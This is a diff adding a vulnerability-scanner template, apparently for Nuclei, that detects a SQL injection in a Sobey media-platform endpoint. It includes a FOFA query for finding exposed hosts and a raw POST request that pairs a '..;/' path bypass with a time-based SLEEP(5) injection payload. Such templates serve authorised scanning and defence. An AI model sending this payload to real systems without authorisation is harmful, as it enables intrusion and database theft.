@@ -1,0 +1,37 @@
+id: sobeylingyun-logicdelete-sqli
+info:
+  name: 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 索贝产品中的 /sobey-mchEditor/mch/WXArticleInt/logicdelete  接口存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/bft15vl6sua3wuo2
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,sobeylingyun
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /sobey-mchEditor/js/..;/mch/WXArticleInt/logicdelete HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 67
+
+        siteCode=&id=1 AND (SELECT 2004 FROM (SELECT(SLEEP(5)))MDfc)&token=
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
